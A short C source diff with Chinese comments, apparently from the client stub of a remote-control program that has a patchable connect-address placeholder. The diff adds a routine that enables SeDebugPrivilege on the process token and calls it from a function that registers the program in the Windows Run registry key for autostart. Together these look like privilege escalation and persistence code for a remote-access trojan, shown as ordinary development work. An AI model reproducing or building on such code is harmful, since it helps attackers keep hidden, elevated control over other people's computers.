@@ -24,6 +24,27 @@ struct CONNECT_ADDRESS
 	int   iPort;
 }g_ConnectAddress={0x1234567,"",0};
 
+//提升权限
+void DebugPrivilege()
+{
+	HANDLE hToken = NULL;
+	//打开当前进程的访问令牌
+	int hRet = OpenProcessToken(GetCurrentProcess(),TOKEN_ALL_ACCESS,&hToken);
+
+	if( hRet)
+	{
+		TOKEN_PRIVILEGES tp;
+		tp.PrivilegeCount = 1;
+		//取得描述权限的LUID
+		LookupPrivilegeValue(NULL,SE_DEBUG_NAME,&tp.Privileges[0].Luid);
+		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+		//调整访问令牌的权限
+		AdjustTokenPrivileges(hToken,FALSE,&tp,sizeof(tp),NULL,NULL);
+
+		CloseHandle(hToken);
+	}
+}
+
 /** 
 * @brief 设置本身开机自启动
 * @param[in] *sPath 注册表的路径
@@ -35,6 +56,8 @@ struct CONNECT_ADDRESS
 */
 BOOL SetSelfStart(const char *sPath, const char *sNmae)
 {
+	DebugPrivilege();
+
 	// 写入的注册表路径
 #define REGEDIT_PATH "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"
 
@@ -103,6 +126,9 @@ int main(int argc, const char *argv[])
 			while(bStop && !bStop() && 0 == status)
 				Sleep(20);
 		} while (bExit && !bExit() && 0 == status);
+
+		while(bStop && !bStop() && 1 == status)
+			Sleep(20);
 	}
 	status = 0;
 	return -1;
